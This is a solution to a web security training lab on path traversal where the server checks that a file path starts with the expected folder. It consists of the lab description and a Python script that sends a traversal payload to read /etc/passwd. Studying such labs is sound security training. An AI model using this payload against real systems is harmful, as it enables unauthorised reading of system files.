# File path traversal, validation of start of path

> This lab contains a path traversal vulnerability in the display of product images.
> The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
> To solve the lab, retrieve the contents of the `/etc/passwd` file.

```python
import requests

# --- Configuration ---
# Lab: File path traversal, validation of start of path
# Replace with your specific lab ID
BASE_URL = "https://0a9e009803a560ea80b149c200b200df.web-security-academy.net/"

def exploit_start_path_validation(base_url):
    """
    Exploits path traversal by including the required directory prefix
    (/var/www/images/) followed by traversal sequences.
    """
    # Payload: Starts with the required folder, then traverses out
    payload = "/var/www/images/../../../etc/passwd"
    
    target_url = f"{base_url}/image?filename={payload}"
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit_start_path_validation(BASE_URL)
```